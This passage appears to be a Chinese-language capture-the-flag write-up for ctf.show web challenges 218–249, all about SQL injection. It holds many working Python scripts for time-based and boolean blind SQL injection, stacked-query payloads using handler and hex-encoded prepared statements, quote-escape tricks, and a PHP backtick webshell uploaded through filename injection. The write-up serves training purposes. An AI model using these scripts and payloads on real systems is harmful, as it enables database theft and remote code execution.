            <span class="token string">'debug'</span><span class="token punctuation">:</span><span class="token string">'0'</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
            <span class="token comment"># time.sleep(0.3)</span>
            tail <span class="token operator">=</span> mid
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>

    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
</code></pre> 
<h2><a id="web218_1022"></a>web218</h2> 
<p>代码水平差，没发现更好的方式</p> 
<pre><code class="prism language-python"><span class="token triple-quoted-string string">"""
Author:Y4tacker
"""</span>
<span class="token keyword">import</span> requests
url <span class="token operator">=</span> <span class="token string">"http://13565a40-808d-44fc-8c3f-4823a3ac8779.chall.ctf.show/api/"</span>

strr <span class="token operator">=</span> <span class="token string">"1234567890{}-qazwsxedcrfvtgbyhnujmikolp"</span>
payload <span class="token operator">=</span> <span class="token string">"select table_name from information_schema.tables where table_schema=database() limit 0,1"</span>
payload <span class="token operator">=</span> <span class="token string">"select column_name from information_schema.columns where table_name='ctfshow_flagxc' limit 1,1"</span>
payload <span class="token operator">=</span> <span class="token string">"select flagaac from ctfshow_flagxc"</span>
j <span class="token operator">=</span> <span class="token number">1</span>
res <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> strr<span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">'ip'</span><span class="token punctuation">:</span> f<span class="token string">"1) or if(substr((select right(flagaac,10) from ctfshow_flagxc),{j},1)='{i}',(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata E),1"</span><span class="token punctuation">,</span>
            <span class="token string">'debug'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>
        <span class="token punctuation">}</span>
        <span class="token comment"># print(i)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.7</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            res <span class="token operator">+=</span> i
            <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
            j<span class="token operator">+=</span><span class="token number">1</span>

<span class="token comment"># flag{c33829azwa2e7-4f11-bf80-58a77877718e}</span>
<span class="token comment"># flag{c33829a7-a2e7-4f11-bf80-589 77877718e}</span>
<span class="token comment"># flag{c33829a7-a2e7-4f11-bf80-58977837718e}</span>
<span class="token comment"># flag{c33829a7-a2e7-4f11-bf80-58a77877718e}</span>
<span class="token comment"># bf40</span>
<span class="token comment"># 8l9a7</span>
<span class="token comment"># 58a77897718e}</span>
</code></pre> 
<h2><a id="web219_1059"></a>web219</h2> 
<pre><code class="prism language-python"><span class="token triple-quoted-string string">"""
Author:Y4tacker
"""</span>
<span class="token keyword">import</span> requests
url <span class="token operator">=</span> <span class="token string">"http://b9430398-f3af-46cc-a239-fe11a9220619.chall.ctf.show/api/"</span>

strr <span class="token operator">=</span> <span class="token string">"_1234567890{}-qazwsxedcrfvtgbyhnujmikolp"</span>
<span class="token comment"># payload = "select table_name from information_schema.tables where table_schema=database() limit 0,1"</span>
<span class="token comment"># payload = "select column_name from information_schema.columns where table_name='ctfshow_flagxca' limit 1,1"</span>
payload <span class="token operator">=</span> <span class="token string">"select flagaabc from ctfshow_flagxca"</span>
j <span class="token operator">=</span> <span class="token number">1</span>
res <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> strr<span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">'ip'</span><span class="token punctuation">:</span> f<span class="token string">"1) or if(substr(({payload}),{j},1)='{i}',(SELECT count(*) FROM information_schema.tables A, information_schema.schemata B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G, information_schema.schemata H,information_schema.schemata I),1"</span><span class="token punctuation">,</span>
            <span class="token string">'debug'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>
        <span class="token punctuation">}</span>
        <span class="token comment"># print(i)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            res <span class="token operator">+=</span> i
            <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
            j<span class="token operator">+=</span><span class="token number">1</span>

<span class="token comment"># data = {<!-- --></span>
<span class="token comment">#             'ip': f"1) or if(1=1,(SELECT count(*) FROM information_schema.tables A, information_schema.schemata B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G, information_schema.schemata H,information_schema.schemata I),1",</span>
<span class="token comment">#             'debug': '1'</span>
<span class="token comment"># }</span>
<span class="token comment"># r = requests.post(url, data=data, timeout=3)</span>

</code></pre> 
<h2><a id="web220_1094"></a>web220</h2> 
<pre><code class="prism language-python"><span class="token triple-quoted-string string">"""
Author:Y4tacker
"""</span>
<span class="token keyword">import</span> requests
url <span class="token operator">=</span> <span class="token string">"http://36c60781-7da4-45f9-b863-59f914dffa84.chall.ctf.show/api/"</span>

strr <span class="token operator">=</span> <span class="token string">"_1234567890{}-qazwsxedcrfvtgbyhnujmikolp"</span>
<span class="token comment"># payload = "select table_name from information_schema.tables where table_schema=database() limit 0,1"</span>
<span class="token comment"># payload = "select column_name from information_schema.columns where table_name='ctfshow_flagxcac' limit 1,1"</span>
payload <span class="token operator">=</span> <span class="token string">"select flagaabcc from ctfshow_flagxcac"</span>
j <span class="token operator">=</span> <span class="token number">1</span>
res <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> strr<span class="token punctuation">:</span>
        res <span class="token operator">+=</span> i
        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">'ip'</span><span class="token punctuation">:</span> f<span class="token string">"1) or if(left(({payload}),{j})='{res}',(SELECT count(*) FROM information_schema.tables A, information_schema.schemata B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G, information_schema.schemata H,information_schema.schemata I),1"</span><span class="token punctuation">,</span>
            <span class="token string">'debug'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>
        <span class="token punctuation">}</span>
        <span class="token comment"># print(i)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
            res <span class="token operator">=</span> res<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
            j<span class="token operator">+=</span><span class="token number">1</span>

</code></pre> 
<h2><a id="web221_1124"></a>web221</h2> 
<p>考点是：MySQL利用procedure analyse()函数优化表结构<br> limit后面能跟的也只有这个了似乎</p> 
<pre><code class="prism language-python"><span class="token triple-quoted-string string">"""
Author:Y4tacker
"""</span>
<span class="token comment"># http://196cf3fd-f920-4018-a714-662ad61571e9.chall.ctf.show/api/?page=1&amp;limit=1 procedure analyse(extractvalue(rand(),concat(0x3a,database())),2)</span>

<span class="token comment"># https://www.jb51.net/article/99980.htm</span>
</code></pre> 
<h2><a id="web222_1136"></a>web222</h2> 
<pre><code class="prism language-python"><span class="token triple-quoted-string string">"""
Author:Y4tacker
"""</span>
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://6119f221-08cd-4363-88d4-1809bd590024.chall.ctf.show/api/"</span>

result <span class="token operator">=</span> <span class="token string">""</span>
i <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>
    head <span class="token operator">=</span> <span class="token number">32</span>
    tail <span class="token operator">=</span> <span class="token number">127</span>

    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">1</span>
        <span class="token comment"># 查数据库</span>
        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>
        <span class="token comment"># 查列名字</span>
        <span class="token comment"># payload = "select column_name from information_schema.columns where table_name='ctfshow_flaga' limit 1,1"</span>
        <span class="token comment"># 查数据---不能一次查完越到后面越不准确</span>
        payload <span class="token operator">=</span> <span class="token string">"select flagaabc from ctfshow_flaga"</span>
        <span class="token comment"># flag{b747hfb7-P8e8-</span>

        params <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">'u'</span><span class="token punctuation">:</span> f<span class="token string">"concat((if (ascii(substr(({payload}),{i},1))&gt;{mid}, sleep(0.05), 2)), 1);"</span>

        <span class="token punctuation">}</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
            tail <span class="token operator">=</span> mid
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>

    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
</code></pre> 
<h2><a id="web223_1178"></a>web223</h2> 
<p>以为是group by的报错注入：<a href="https://www.cnblogs.com/02SWD/p/CTF-sql-group_by.html" rel="nofollow">CTF-sql-group by报错注入</a><br> 姿势不对，我们用盲注试试，利用正确与错误返回的不同结果注入<br> <img src="https://images2.imgbox.com/01/99/g8eXRME0_o.png" alt="在这里插入图片描述"></p> 
<p><img src="https://images2.imgbox.com/63/e5/yQaCq6TO_o.png" alt="在这里插入图片描述"><br> 上脚本</p> 
<pre><code class="prism language-python"><span class="token triple-quoted-string string">"""
Author:Y4tacker
"""</span>
<span class="token keyword">import</span> requests


<span class="token keyword">def</span> <span class="token function">generateNum</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
    res <span class="token operator">=</span> <span class="token string">'true'</span>
    <span class="token keyword">if</span> num <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> res
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>num <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            res <span class="token operator">+=</span> <span class="token string">"+true"</span>
        <span class="token keyword">return</span> res


url <span class="token operator">=</span> <span class="token string">"http://ff765902-0dec-4688-8cd2-1a4cc429d30a.chall.ctf.show/api/"</span>
i <span class="token operator">=</span> <span class="token number">0</span>
res <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
    head <span class="token operator">=</span> <span class="token number">32</span>
    tail <span class="token operator">=</span> <span class="token number">127</span>
    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>

    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">1</span>
        <span class="token comment"># 查数据库-ctfshow_flagas</span>
        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>
        <span class="token comment"># 查字段-flagasabc</span>
        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagas'"</span>
        <span class="token comment"># 查flag</span>
        payload <span class="token operator">=</span> <span class="token string">"select flagasabc from ctfshow_flagas"</span>
        params <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">"u"</span><span class="token punctuation">:</span> f<span class="token string">"if(ascii(substr(({payload}),{generateNum(i)},{generateNum(1)}))&gt;{generateNum(mid)},username,'a')"</span>
        <span class="token punctuation">}</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">)</span>
        <span class="token comment"># print(r.json()['data'])</span>
        <span class="token keyword">if</span> <span class="token string">"userAUTO"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            tail <span class="token operator">=</span> mid
    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
        res <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>

</code></pre> 
<h2><a id="web224_1234"></a>web224</h2> 
<p>这道题比较骚，我拿扫描器扫描到了有<code>robots.txt</code><br> <img src="https://images2.imgbox.com/2d/6d/MwK1U6hQ_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/f3/7c/9GLLCloM_o.png" alt="在这里插入图片描述"><br> 重置密码后登录，发现需要上传文件，无论上传啥都不行醉了<br> <img src="https://images2.imgbox.com/a7/a4/1y9h4KNP_o.png" alt="在这里插入图片描述"><br> 文件名注入，下载群里的<code>payload.bin</code>，十六进制的意思是<code>&lt;?=``$_GET[1]?``&gt;</code>,csdn有毒中间只有一个反引号，大家知道这是啥吧<br> <img src="https://images2.imgbox.com/c5/d6/cPPBen8V_o.png" alt="在这里插入图片描述"><br> 因此我们就可以进行rce了<br> <img src="https://images2.imgbox.com/77/10/peCvMP2u_o.png" alt="在这里插入图片描述"><br> 得到flag<br> <img src="https://images2.imgbox.com/1a/6b/QZD4Tmd0_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="web225_1246"></a>web225</h2> 
<h3><a id="handler_1247"></a>方法一：handler</h3> 
<p>没有过滤show<br> <code>username=ctfshow';show tables;</code><br> <img src="https://images2.imgbox.com/12/ae/mUTY0AJx_o.png" alt="在这里插入图片描述"><br> 用handler读取<code>username=ctfshow';show tables;handler ctfshow_flagasa open;handler ctfshow_flagasa read first;</code><br> <img src="https://images2.imgbox.com/c9/e2/PdGvlW1D_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="_1253"></a>方法二：预处理</h2> 
<p>利用concat绕过一切过滤，之后就是替换后面的<code>database()</code>为想要执行的语句即可，别忘了加空格，对于不知道啥是预处理的可以看看我这篇博客，<a href="https://blog.csdn.net/solitudi/article/details/107823398?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160652999219721940215459%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=160652999219721940215459&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-1-107823398.pc_v2_rank_blog_default&amp;utm_term=%E5%BC%BA%E7%BD%91%E6%9D%AF&amp;spm=1018.2118.3001.4450">[SQL注入][强网杯 2019]随便注(三种姿势)</a><br> <code>username=user1';PREPARE y4tacker from concat('s','elect', ' database()');EXECUTE y4tacker;</code><br> <img src="https://images2.imgbox.com/94/28/jLat0w7X_o.png" alt="在这里插入图片描述"><br> 当然<code>concat(char(115,101,108,101,99,116)</code>也可以代替<code>select</code></p> 
<h2><a id="web226web228web230_1258"></a>web226/web228-web230</h2> 
<p>这几道题都是这个套路,除了web227是另一个东西<br> 过滤了很多，包括<code>(</code>所以预处理语句我们可以更骚一点，用十六进制替换<br> <a href="https://www.sojson.com/hexadecimal.html" rel="nofollow">来个在线转换地址</a><br> <img src="https://images2.imgbox.com/53/05/r1xJWydQ_o.png" alt="在这里插入图片描述"><br> 记得最后结果前面加上<code>0x</code><br> 因此<code>username=user1';PREPARE y4tacker from 0x73656c6563742067726f75705f636f6e636174287461626c655f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d64617461626173652829;EXECUTE y4tacker;</code><br> 后面怎么做就不需要多说了吧，常规sql注入语句转16进制即可<br> <img src="https://images2.imgbox.com/43/ae/6PMlA3S0_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="web227_1267"></a>web227</h2> 
<p>这道题，你就算找遍所有地方基本上都找不到<code>flag</code>表<br> 先给出其中一个payload<code>1';call getFlag();</code>虽然能得到答案但是意义不大<br> 这道题考点其实是<code>查看MySQL的存储过程</code><br> 看看网上这篇文章<a href="https://blog.csdn.net/qq_41573234/article/details/80411079">MySQL——查看存储过程和函数</a><br> 我们去查<code>information_schema.routines</code>表<br> <img src="https://images2.imgbox.com/38/84/5E2r5dq1_o.png" alt="在这里插入图片描述"><br> 出现了这个自定义的函数，不过下面flag都给了哈哈哈<br> <img src="https://images2.imgbox.com/86/dd/i4WihAiG_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="web231232_1276"></a>web231-232</h2> 
<p><code>password=1',username=user() where 1=1#&amp;username=1</code><br> <img src="https://images2.imgbox.com/99/a2/itgGdVEF_o.png" alt="在这里插入图片描述"><br> 发现成功了<br> <img src="https://images2.imgbox.com/ea/ec/J6UvQFSL_o.png" alt="在这里插入图片描述"><br> 接下来只需要改payloa即可<br> 查表名<br> <code>password=1',username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where 1=1#&amp;username=1</code><br> 查列名<br> <code>password=1',username=(select group_concat(column_name) from information_schema.columns where table_name='flaga') where 1=1#&amp;username=1</code><br> 得到flag<br> <code>password=1',username=(select flagas from flaga) where 1=1#&amp;username=1</code><br> 当然子查询也行<br> <code>password=',username=(select a from (select group_concat(flagas)a from flaga) y4tacker) where 1=1;#&amp;username=1</code></p> 
<h2><a id="web233_1290"></a>web233</h2> 
<p>这道题盲注</p> 
<pre><code class="prism language-python"><span class="token triple-quoted-string string">"""
Author:Y4tacker
"""</span>
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://4f5b7639-6d01-45c4-9610-e11239ba8c90.chall.ctf.show/api/?page=1&amp;limit=10"</span>

result <span class="token operator">=</span> <span class="token string">""</span>
i <span class="token operator">=</span> <span class="token number">0</span>

<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>
    head <span class="token operator">=</span> <span class="token number">32</span>
    tail <span class="token operator">=</span> <span class="token number">127</span>

    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">1</span>
        <span class="token comment"># 查数据库</span>
        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>
        <span class="token comment"># 查表名</span>
        <span class="token comment"># payload = "select column_name from information_schema.columns where table_name='flag233333' limit 1,1"</span>
        <span class="token comment"># 查数据</span>
        payload <span class="token operator">=</span> <span class="token string">"select flagass233 from flag233333"</span>
        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">'username'</span><span class="token punctuation">:</span> f<span class="token string">"1' or if(ascii(substr(({payload}),{i},1))&gt;{mid},sleep(0.05),1)#"</span><span class="token punctuation">,</span>
            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'4'</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">)</span>
            tail <span class="token operator">=</span> mid
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>

</code></pre> 
<h2><a id="web234_1332"></a>web234</h2> 
<p>很遗憾单引号被过滤了，但是巅峰极客刚刚考过，用<code>\</code>实现逃逸<br> 原来的语句是<br> <code>$sql = "update ctfshow_user set pass = '{$password}' where username = '{$username}';";</code><br> 但是传入单引号后<br> <code>$sql = "update ctfshow_user set pass = '\' where username = 'username';";</code><br> 这样<code>pass</code>里面的内容就是<code>' where username =</code>,接下来<code>username</code>里面的参数就是可以控制的了</p> 
<pre><code class="prism language-php"><span class="token shell-comment comment"># 考点:\实现逃逸</span>
<span class="token double-quoted-string string">""</span><span class="token double-quoted-string string">"
Author:Y4tacker
"</span><span class="token double-quoted-string string">""</span>
<span class="token shell-comment comment"># username=,username=(select group_concat(table_name) from information_schema.columns where table_schema=database())-- - &amp;password=\</span>
<span class="token shell-comment comment"># username=,username=(select group_concat(column_name) from information_schema.columns where table_name=0x666c6167323361)-- - &amp;password=\</span>
<span class="token shell-comment comment"># username=,username=(select flagass23s3 from flag23a)-- - &amp;password=\</span>
</code></pre> 
<h2><a id="web235_1348"></a>web235</h2> 
<p>过滤<code>or '</code>因此information表也不能用了<br> 考虑其他表<code>sys</code>也没有，参考了这两篇文章<br> <a href="https://www.jb51.net/article/134678.htm" rel="nofollow">概述MySQL统计信息</a><br> <a href="https://zhuanlan.zhihu.com/p/98206699" rel="nofollow">CTF|mysql之无列名注入</a></p> 
<pre><code class="prism language-python"><span class="token triple-quoted-string string">"""
Author:Y4tacker
"""</span>
<span class="token comment"># username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())-- - &amp;password=\</span>
<span class="token comment"># username=,username=(select b from (select 1,2 as b,3 union select * from flag23a1 limit 1,1)a)-- - &amp;password=\</span>
或者一样的没区别只是如果没过率数字可以这样玩
<span class="token comment"># username=,username=(select `2` from(select 1,2,3 union select * from flag23a1 limit 1,1)a)-- - &amp;password=\</span>
</code></pre> 
<h2><a id="web236_1362"></a>web236</h2> 
<pre><code class="prism language-python"><span class="token triple-quoted-string string">"""
Author:Y4tacker
"""</span>
<span class="token comment"># username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())-- - &amp;password=\</span>
<span class="token comment"># username=,username=(select to_base64(b) from (select 1,2 as b,3 union select * from flaga limit 1,1)a)-- - &amp;password=\</span>
</code></pre> 
<h2><a id="web237_1370"></a>web237</h2> 
<pre><code class="prism language-python"><span class="token triple-quoted-string string">"""
Author:Y4tacker
"""</span>
<span class="token comment"># username=3',(select group_concat(table_name) from information_schema.tables where table_schema=database()));-- A&amp;password=1</span>
<span class="token comment"># username=3',(select group_concat(column_name) from information_schema.columns where table_name='flag'));-- A&amp;password=1</span>
<span class="token comment"># username=3',(select flagass23s3 from flag));-- A&amp;password=1</span>
</code></pre> 
<h2><a id="web238_1379"></a>web238</h2> 
<pre><code class="prism language-python"><span class="token triple-quoted-string string">"""
Author:Y4tacker
"""</span>
<span class="token comment"># username=3',(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())));#&amp;password=1</span>
<span class="token comment"># username=3',(select(group_concat(column_name))from(information_schema.columns)where(table_name='flagb')));#&amp;password=1</span>
<span class="token comment"># username=3',(select(flag)from(flagb)));#&amp;password=1</span>
</code></pre> 
<h2><a id="web239_1388"></a>web239</h2> 
<p><code>//过滤空格 or</code><br> 首先查表<br> <code>username=1',(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())))#&amp;password=1</code><br> <img src="https://images2.imgbox.com/cd/ce/2fnT9l2K_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="web240_1395"></a>web240</h2> 
<p>我直呼算命，群主过滤了基本上所有的东西，根据前面规律字段就是<code>flag</code>，所以只需要爆破出表就行</p> 
<pre><code class="prism language-python"><span class="token triple-quoted-string string">"""
Author:Y4tacker
"""</span>
<span class="token keyword">import</span> random
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://35963b4d-3501-4bf2-b888-668ad24e1bc5.chall.ctf.show"</span>
url_insert <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/api/insert.php"</span>
url_flag <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/api/?page=1&amp;limit=1000"</span>


<span class="token comment"># 看命函数</span>
<span class="token keyword">def</span> <span class="token function">generate_random_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sttr <span class="token operator">=</span> <span class="token string">'ab'</span>
    str_list <span class="token operator">=</span> <span class="token punctuation">[</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>sttr<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    random_str <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>str_list<span class="token punctuation">)</span>
    <span class="token keyword">return</span> random_str


<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
        <span class="token string">'username'</span><span class="token punctuation">:</span> f<span class="token string">"1',(select(flag)from(flag{generate_random_str()})))#"</span><span class="token punctuation">,</span>
        <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">""</span>
    <span class="token punctuation">}</span>
    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url_insert<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
    r2 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url_flag<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">"flag"</span> <span class="token keyword">in</span> r2<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> r2<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span>  <span class="token string">"flag"</span> <span class="token keyword">in</span> i<span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
                <span class="token keyword">break</span>
        <span class="token keyword">break</span>
</code></pre> 
<h2><a id="web249_1433"></a>web249</h2> 
<p>猜测应该是后端用的intval校验，存在漏洞，所以传一个数组即可<code>http://a3f32775-dcc0-42e2-acba-537e6fd4be17.chall.ctf.show/api/?id[]=flag</code><br> <img src="https://images2.imgbox.com/6a/68/jPzwziIs_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="_1437"></a>好文推荐</h2> 
